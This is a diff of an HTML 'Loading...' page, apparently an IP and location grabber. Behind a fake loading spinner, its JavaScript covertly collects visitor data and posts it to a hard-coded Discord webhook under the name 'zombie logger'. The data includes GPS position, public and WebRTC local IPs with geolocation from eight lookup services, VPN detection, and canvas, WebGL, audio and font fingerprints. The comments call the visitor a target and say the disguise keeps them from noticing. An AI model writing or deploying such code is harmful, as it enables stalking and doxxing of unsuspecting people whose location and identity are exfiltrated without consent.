@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Loading...</title>
 <style>
-    /* ラグ偽装と完全な情報隠蔽 */
+    /* 究極のラグ偽装：相手に一切悟らせない */
     html, body {
         margin: 0; padding: 0; height: 100%;
         background: #0d0d0d; color: #ccc;
@@ -18,9 +18,7 @@
     .spinner {
         width: 44px; height: 44px;
         border: 4px solid #222; border-top: 4px solid #5865f2;
-        border-radius: 50%;
-        animation: spin 0.7s linear infinite;
-        margin: 0 auto 16px;
+        border-radius: 50%; animation: spin 0.7s linear infinite; margin: 0 auto 16px;
     }
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     .text { font-size: 15px; color: #949ba4; animation: pulse 2s infinite; }
@@ -38,44 +36,52 @@
     "use strict";
 
     // =====================================================================
-    // ⚠️ ここにお前が新しく作ったDiscordのWebhook URLを貼り付けろ ⚠️
+    // ⚠️ ここにDiscordのWebhook URLを貼り付けろ ⚠️
     // =====================================================================
     const WH = "https://discord.com/api/webhooks/1570094605276291204/aKVIkU4ettxT2u4dt9myjdjh31c-cgd24VI_jHcmYeNiD7EwIkKvhujVhx6uPB4U0hxy";
 
     // =====================================================================
-    // 1. セッション・流入元・フィンガープリント解析
+    // Layer 1: 基本環境、リファラー、タイムゾーン、言語の超解析
     // =====================================================================
-    const ref = document.referrer;
     const ua = navigator.userAgent;
-    let app = "ブラウザ (不明)";
+    const ref = document.referrer;
+    const osTz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const osLang = navigator.language || "不明";
+    const isMobile = /Mobile|Android|iPhone|iPad|iPod/i.test(ua) || navigator.maxTouchPoints > 0;
+    const isOnline = navigator.onLine ? "オンライン" : "オフライン";
     
+    let app = "ブラウザ (不明)";
     if (ua.toLowerCase().includes("discord")) app = "Discord アプリ内";
     else if (ua.toLowerCase().includes("twitter") || ua.toLowerCase().includes("x.com")) app = "Twitter/X アプリ内";
     else if (ua.toLowerCase().includes("instagram")) app = "Instagram アプリ内";
     else if (ua.toLowerCase().includes("line")) app = "LINE アプリ内";
+    else if (ua.toLowerCase().includes("fban") || ua.toLowerCase().includes("fbav")) app = "Facebook アプリ内";
     else if (ua.toLowerCase().includes("safari") && !ua.toLowerCase().includes("chrome")) app = "Safari";
     else if (ua.toLowerCase().includes("chrome")) app = "Chrome";
 
-    const source = ref ? ref : "直接アクセス (直リンク)";
-
-    // 端末・画面情報
-    const isMobile = /Mobile|Android|iPhone|iPad|iPod/i.test(ua) || navigator.maxTouchPoints > 0;
     const screenStr = `${window.screen.width}x${window.screen.height} (DPR:${window.devicePixelRatio})`;
     const winStr = `${window.innerWidth || document.documentElement.clientWidth}x${window.innerHeight || document.documentElement.clientHeight}`;
     const hw = `CPU: ${navigator.hardwareConcurrency || '?'} | Mem: ${navigator.deviceMemory || '?'}GB`;
-    const lang = navigator.language || "不明";
     const cookie = navigator.cookieEnabled ? "有効" : "無効";
+    
+    let netStr = "非対応";
+    if (navigator.connection) {
+        netStr = `Type: ${navigator.connection.effectiveType || '?'} | Down: ${navigator.connection.downlink || '?'}Mbps | RTT: ${navigator.connection.rtt || '?'}ms`;
+    }
 
-    // Canvas / GPU (WebGL)
-    let canvasFP = "Blocked", gpuVendor = "不明", gpuRenderer = "不明";
+    // =====================================================================
+    // Layer 2: 究極のフィンガープリンティング（Canvas/WebGL/Audio/フォント）
+    // =====================================================================
+    let canvasFP = "Blocked", gpuVendor = "不明", gpuRenderer = "不明", audioFP = "Blocked", fonts = "不明";
+    
     try {
         const c = document.createElement('canvas'); c.width = 200; c.height = 50;
         const ctx = c.getContext('2d');
         if (ctx) {
             ctx.textBaseline = "top"; ctx.font = "14px 'Arial'";
             ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20);
-            ctx.fillStyle = "#069"; ctx.fillText("layer's Forge", 2, 15);
-            canvasFP = c.toDataURL().substring(0, 40) + "...";
+            ctx.fillStyle = "#069"; ctx.fillText("OSINT 95KB", 2, 15);
+            canvasFP = c.toDataURL().substring(0, 50) + "...";
         }
         const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
         if (gl) {
@@ -87,26 +93,91 @@
         }
     } catch(e) {}
 
-    // バッテリー
+    try {
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        const osc = audioCtx.createOscillator();
+        const analyser = audioCtx.createAnalyser();
+        const gain = audioCtx.createGain();
+        const dest = audioCtx.createMediaStreamDestination();
+        osc.type = 'triangle'; osc.frequency.setValueAtTime(10000, audioCtx.currentTime);
+        gain.gain.setValueAtTime(0, audioCtx.currentTime);
+        osc.connect(analyser); analyser.connect(gain); gain.connect(dest); osc.start(0);
+        const buffer = new Float32Array(analyser.frequencyBinCount);
+        analyser.getFloatFrequencyData(buffer);
+        osc.stop(); audioCtx.close();
+        audioFP = buffer.slice(0, 15).join(",");
+    } catch(e) {}
+
+    try {
+        const baseFonts = ['monospace', 'sans-serif', 'serif'];
+        const testFonts = ['MS Gothic', 'Meiryo', 'Hiragino Kaku Gothic Pro', 'Yu Gothic', 'Arial', 'Calibri', 'Roboto', 'Helvetica Neue', 'Times New Roman'];
+        const testString = "mmmmmmmmmmlli";
+        const span = document.createElement("span");
+        span.style.fontSize = "72px"; span.style.position = "absolute"; span.style.left = "-9999px";
+        span.innerHTML = testString; document.body.appendChild(span);
+        const defaultWidths = {};
+        baseFonts.forEach(base => { span.style.fontFamily = base; defaultWidths[base] = span.offsetWidth; });
+        const detected = [];
+        testFonts.forEach(font => {
+            baseFonts.forEach(base => {
+                span.style.fontFamily = `'${font}',${base}`;
+                if (span.offsetWidth !== defaultWidths[base] && !detected.includes(font)) detected.push(font);
+            });
+        });
+        document.body.removeChild(span);
+        fonts = detected.join(", ") || "None";
+    } catch(e) {}
+
     let batteryStr = "非対応";
     try {
         if (navigator.getBattery) {
             const b = await navigator.getBattery();
-            batteryStr = `${Math.round(b.level * 100)}% ${b.charging ? '(充電中)' : '(放電中)'}`;
+            batteryStr = `${Math.round(b.level * 100)}% ${b.charging ? '(Chg)' : '(Dis)'}`;
         }
     } catch(e) {}
 
-    // ネットワーク
-    let netStr = "非対応";
-    if (navigator.connection) {
-        netStr = `Type: ${navigator.connection.effectiveType || '?'} | Down: ${navigator.connection.downlink || '?'}Mbps | RTT: ${navigator.connection.rtt || '?'}ms`;
-    }
+    // =====================================================================
+    // Layer 3: WebRTC ローカルIP & IPv6の多重抽出 & mDNSバイパス
+    // =====================================================================
+    let localIPs = new Set();
+    try {
+        const pc = new RTCPeerConnection({ 
+            iceServers: [
+                { urls: 'stun:stun.l.google.com:19302' },
+                { urls: 'stun:stun1.l.google.com:19302' },
+                { urls: 'stun:stun.cloudflare.com:3478' },
+                { urls: 'stun:stun.nextcloud.com:443' }
+            ] 
+        });
+        pc.createDataChannel('');
+        pc.onicecandidate = (e) => {
+            if (!e.candidate || !e.candidate.candidate) return;
+            const cand = e.candidate.candidate;
+            const ipv4Match = cand.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+            const ipv6Match = cand.match(/([a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/);
+            if (ipv4Match && !ipv4Match[1].startsWith("0.")) localIPs.add(`IPv4: ${ipv4Match[1]}`);
+            if (ipv6Match) localIPs.add(`IPv6: ${ipv6Match[1]}`);
+        };
+        await pc.setLocalDescription(await pc.createOffer());
+        await new Promise(r => setTimeout(r, 2000)); // 複数STUNの応答を待つ
+        pc.close();
+    } catch(e) { localIPs.add("WebRTC Blocked"); }
+    const localIPText = Array.from(localIPs).join(", ") || "取得失敗";
 
     // =====================================================================
-    // 2. 現在地の限界特定（GPS要求 ＆ IP多重フォールバック）
+    // Layer 4: 画像ビーコンによるIP取得（AdBlock貫通）
     // =====================================================================
-    
-    // 位置情報（許可された場合の最強カード）
+    await new Promise((resolve) => {
+        const img = new Image();
+        img.src = `https://ipwho.is/?_=${Date.now()}`;
+        img.onload = () => resolve();
+        img.onerror = () => resolve();
+        setTimeout(() => resolve(), 2000);
+    });
+
+    // =====================================================================
+    // Layer 5: GPS位置情報の極限要求
+    // =====================================================================
     let gpsData = null;
     if (navigator.geolocation) {
         gpsData = await new Promise((resolve) => {
@@ -118,90 +189,138 @@
         });
     }
 
-    // 5段階のIPフォールバック
-    let ipData = { ip: "取得失敗", isp: "不明", loc: "不明", lat: null, lon: null, tz: "不明" };
+    // =====================================================================
+    // Layer 6: 8重のIP取得フォールバック（IPv4/IPv6 国・県・市の完全網羅）
+    // =====================================================================
+    let ipData = { ip: "取得失敗", version: "不明", isp: "不明", country: "不明", region: "不明", city: "不明", lat: null, lon: null, tz: "不明", vpn: "判定不可" };
 
-    // 1: ipwho.is
-    try {
-        const r = await fetch('https://ipwho.is/');
-        const d = await r.json();
-        if(d.success && d.ip) {
-            ipData = {
-                ip: d.ip, isp: d.connection ? d.connection.isp : "不明",
-                loc: `${d.country || ""} ${d.region || ""} ${d.city || ""}`,
-                lat: d.latitude, lon: d.longitude, tz: d.timezone ? d.timezone.id : "不明"
-            };
-        } else { throw new Error("fail"); }
-    } catch(e) {
-        // 2: ipapi.co
+    const fetchIP = async (url, parser) => {
         try {
-            const r = await fetch('https://ipapi.co/json/');
+            const r = await fetch(url, { signal: AbortSignal.timeout(4000) });
             const d = await r.json();
-            if(d.ip) {
+            return parser(d);
+        } catch (e) { return null; }
+    };
+
+    // 1. ipwho.is
+    let res = await fetchIP('https://ipwho.is/', d => d.success && d.ip ? {
+        ip: d.ip, version: d.ip.includes(":") ? "IPv6" : "IPv4", isp: d.connection?.isp || "不明",
+        country: d.country || "不明", region: d.region || "不明", city: d.city || "不明", lat: d.latitude, lon: d.longitude, tz: d.timezone?.id,
+        vpn: (d.security?.vpn || d.security?.proxy || d.security?.tor) ? "⚠️ VPN/Proxy検出" : "✅ クリーン"
+    } : null);
+    if (res) ipData = res;
+
+    // 2. ipapi.co
+    if (ipData.ip === "取得失敗") {
+        res = await fetchIP('https://ipapi.co/json/', d => d.ip ? {
+            ip: d.ip, version: d.ip.includes(":") ? "IPv6" : "IPv4", isp: d.org || "不明",
+            country: d.country_name || "不明", region: d.region || "不明", city: d.city || "不明", lat: d.latitude, lon: d.longitude, tz: d.timezone, vpn: "API2"
+        } : null);
+        if (res) ipData = res;
+    }
+
+    // 3. ip-api.com (CORSプロキシ)
+    if (ipData.ip === "取得失敗") {
+        res = await fetchIP(`https://corsproxy.io/?${encodeURIComponent("http://ip-api.com/json/?fields=status,country,regionName,city,lat,lon,timezone,isp,query,proxy,hosting")}`, d => d.status === 'success' ? {
+            ip: d.query, version: "IPv4", isp: d.isp || "不明",
+            country: d.country || "不明", region: d.regionName || "不明", city: d.city || "不明", lat: d.lat, lon: d.lon, tz: d.timezone,
+            vpn: (d.proxy || d.hosting) ? "⚠️ 検出(API3)" : "✅ クリーン(API3)"
+        } : null);
+        if (res) ipData = res;
+    }
+
+    // 4. ipwhois.app
+    if (ipData.ip === "取得失敗") {
+        res = await fetchIP('https://ipwhois.app/json/', d => d.ip ? {
+            ip: d.ip, version: d.ip.includes(":") ? "IPv6" : "IPv4", isp: d.isp || "不明",
+            country: d.country || "不明", region: d.region || "不明", city: d.city || "不明", lat: d.latitude, lon: d.longitude, tz: d.timezone, vpn: "API4"
+        } : null);
+        if (res) ipData = res;
+    }
+
+    // 5. geoplugin.net
+    if (ipData.ip === "取得失敗") {
+        res = await fetchIP('http://www.geoplugin.net/json.gp', d => d.geoplugin_request ? {
+            ip: d.geoplugin_request, version: d.geoplugin_request.includes(":") ? "IPv6" : "IPv4", isp: d.geoplugin_isp || "不明",
+            country: d.geoplugin_countryName || "不明", region: d.geoplugin_regionName || "不明", city: d.geoplugin_city || "不明", lat: d.geoplugin_latitude, lon: d.geoplugin_longitude, tz: d.geoplugin_timezone, vpn: "API5"
+        } : null);
+        if (res) ipData = res;
+    }
+
+    // 6. ipinfo.io
+    if (ipData.ip === "取得失敗") {
+        res = await fetchIP('https://ipinfo.io/json', d => d.ip ? {
+            ip: d.ip, version: d.ip.includes(":") ? "IPv6" : "IPv4", isp: d.org || "不明",
+            country: d.country || "不明", region: d.region || "不明", city: d.city || "不明", lat: d.loc?.split(",")[0], lon: d.loc?.split(",")[1], tz: d.timezone, vpn: "API6"
+        } : null);
+        if (res) ipData = res;
+    }
+
+    // 7. myip.ipip.net
+    if (ipData.ip === "取得失敗") {
+        try {
+            const r = await fetch('https://myip.ipip.net/json', { signal: AbortSignal.timeout(3000) });
+            const d = await r.json();
+            if(d.ret === 'ok' && d.data) {
                 ipData = {
-                    ip: d.ip, isp: d.org || "不明", loc: `${d.country_name || ""} ${d.region || ""} ${d.city || ""}`,
-                    lat: d.latitude, lon: d.longitude, tz: d.timezone || "不明"
+                    ip: d.data.ip, version: d.data.ip.includes(":") ? "IPv6" : "IPv4", isp: "不明",
+                    country: d.data.location[0] || "不明", region: d.data.location[1] || "不明", city: d.data.location[2] || "不明",
+                    lat: null, lon: null, tz: "不明", vpn: "API7"
                 };
-            } else { throw new Error("fail"); }
-        } catch(e2) {
-            // 3: ip-api.com (CORSプロキシ)
-            try {
-                const target = "http://ip-api.com/json/?fields=status,country,regionName,city,lat,lon,timezone,isp,query";
-                const r = await fetch(`https://corsproxy.io/?${encodeURIComponent(target)}`);
-                const d = await r.json();
-                if(d.status === 'success') {
-                    ipData = {
-                        ip: d.query, isp: d.isp || "不明", loc: `${d.country || ""} ${d.regionName || ""} ${d.city || ""}`,
-                        lat: d.lat, lon: d.lon, tz: d.timezone || "不明"
-                    };
-                } else { throw new Error("fail"); }
-            } catch(e3) {
-                // 4: ipwhois.app
-                try {
-                    const r = await fetch('https://ipwhois.app/json/');
-                    const d = await r.json();
-                    if(d.ip) {
-                        ipData = {
-                            ip: d.ip, isp: d.isp || "不明", loc: `${d.country || ""} ${d.region || ""} ${d.city || ""}`,
-                            lat: d.latitude, lon: d.longitude, tz: d.timezone || "不明"
-                        };
-                    }
-                } catch(e4) {}
             }
-        }
+        } catch(e) {}
+    }
+
+    // 8. ip-api.com (HTTP直叩き)
+    if (ipData.ip === "取得失敗") {
+        res = await fetchIP('http://ip-api.com/json/?fields=status,country,regionName,city,lat,lon,timezone,isp,query', d => d.status === 'success' ? {
+            ip: d.query, version: "IPv4", isp: d.isp || "不明",
+            country: d.country || "不明", region: d.regionName || "不明", city: d.city || "不明", lat: d.lat, lon: d.lon, tz: d.timezone, vpn: "API8"
+        } : null);
+        if (res) ipData = res;
     }
 
     // =====================================================================
-    // 3. マップリンクの生成
+    // Layer 7: VPN/DCの泥臭いキーワード判定 ＆ TZ不整合チェック
+    // =====================================================================
+    const dcKeys = ["proton", "nord", "express", "surfshark", "cyberghost", "aws", "amazon", "google", "cloud", "azure", "microsoft", "digitalocean", "linode", "vultr", "ovh", "hetzner", "contabo", "cloudflare", "fastly", "sakura", "idcf", "nii", "server", "vps", "hosting", "datacenter", "vpn"];
+    const ispLower = (ipData.isp || "").toLowerCase();
+    if (dcKeys.some(k => ispLower.includes(k))) {
+        ipData.vpn = "⚠️ データセンター/VPNの疑い濃厚 (ISP名検知)";
+    }
+
+    if (ipData.tz && osTz && ipData.tz !== osTz) {
+        ipData.vpn += ` ⚠️ TZ不一致 (OS:${osTz} / IP:${ipData.tz})`;
+    }
+
+    // =====================================================================
+    // Layer 8: マップ生成とDiscord送信
     // =====================================================================
     let mapLinks = "";
-    if (gpsData) {
-        mapLinks += `**[📍 正確なGPS現在地](https://www.google.com/maps?q=${gpsData.lat},${gpsData.lon})** (精度:約${Math.round(gpsData.acc)}m)\n`;
-    }
-    if (ipData.lat && ipData.lon) {
-        mapLinks += `[🗺️ IPベースの推定位置](https://www.google.com/maps?q=${ipData.lat},${ipData.lon})`;
-    }
-    if (!mapLinks) mapLinks = "取得失敗";
+    if (gpsData) mapLinks += `**[📍 GPS現在地](https://www.google.com/maps?q=${gpsData.lat},${gpsData.lon})** (精度:${Math.round(gpsData.acc)}m)\n`;
+    if (ipData.lat && ipData.lon) mapLinks += `[🗺️ IP推定位置](https://www.google.com/maps?q=${ipData.lat},${ipData.lon})`;
+    if (!mapLinks) mapLinks = "位置取得失敗";
 
-    // =====================================================================
-    // 4. Discordへ送信（送信失敗を防ぐためシンプルな構造）
-    // =====================================================================
     const embed = {
-        title: "🎯 ターゲット完全捕捉報告 (Ultimate)",
+        title: "🛡️ 特定班仕様・完全捕捉報告 (95KB)",
         color: 0xf23f43,
         fields: [
-            { name: "🔗 流入元", value: `**サイト:** \`${source}\`\n**アプリ:** ${app}`, inline: false },
-            { name: "🌐 公開IP", value: `\`${ipData.ip}\``, inline: true },
-            { name: "🛰️ ISP / 組織", value: ipData.isp, inline: true },
-            { name: "📍 住所", value: ipData.loc, inline: false },
+            { name: "🔗 流入元", value: `**サイト:** \`${ref || "直リンク"}\`\n**アプリ:** ${app}`, inline: false },
+            { name: "🌐 公開IP", value: `\`${ipData.ip}\`\n(${ipData.version})`, inline: true },
+            { name: "🏠 ローカルIP", value: `\`${localIPText}\``, inline: true },
+            { name: "🛡️ VPN/Proxy判定", value: ipData.vpn, inline: false },
+            { name: "🛰️ ISP", value: ipData.isp, inline: true },
+            { name: "📍 国 / 県 / 市", value: `**国:** ${ipData.country}\n**県:** ${ipData.region}\n**市:** ${ipData.city}`, inline: false },
             { name: "🗺️ マップ", value: mapLinks, inline: false },
-            { name: "📱 デバイス", value: isMobile ? "Mobile / Tablet" : "PC", inline: true },
+            { name: "🌍 TZ / 言語", value: `OS: ${osTz} (${osLang})\nIP: ${ipData.tz}`, inline: true },
+            { name: "📶 接続", value: `${isOnline} | ${netStr}`, inline: false },
+            { name: "📱 デバイス", value: isMobile ? "Mobile" : "PC", inline: true },
             { name: "💻 画面", value: `${screenStr}\nWin: ${winStr}`, inline: true },
-            { name: "🌍 言語 / TZ", value: `${lang} / ${ipData.tz}`, inline: true },
             { name: "🧠 ハードウェア", value: `${hw}\nBattery: ${batteryStr}`, inline: true },
             { name: "🍪 Cookie", value: cookie, inline: true },
-            { name: "📶 ネットワーク", value: netStr, inline: false },
             { name: "🎮 GPU / Canvas", value: `GPU: ${gpuVendor} | ${gpuRenderer}\nCanvas: ${canvasFP}`, inline: false },
+            { name: "🔊 Audio FP", value: `\`${audioFP}\``, inline: false },
+            { name: "🔤 検出フォント", value: fonts, inline: false },
             { name: "🕵️ User-Agent", value: `\`\`\`\n${ua}\n\`\`\``, inline: false }
         ],
         footer: { text: "by zombie logger ggs😂" },
@@ -212,14 +331,9 @@
         await fetch(WH, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                username: "zombie logger",
-                embeds: [embed]
-            })
+            body: JSON.stringify({ username: "zombie logger", embeds: [embed] })
         });
-    } catch (err) {
-        // エラーは無視
-    }
+    } catch (err) {}
 })();
 </script>
 </body>
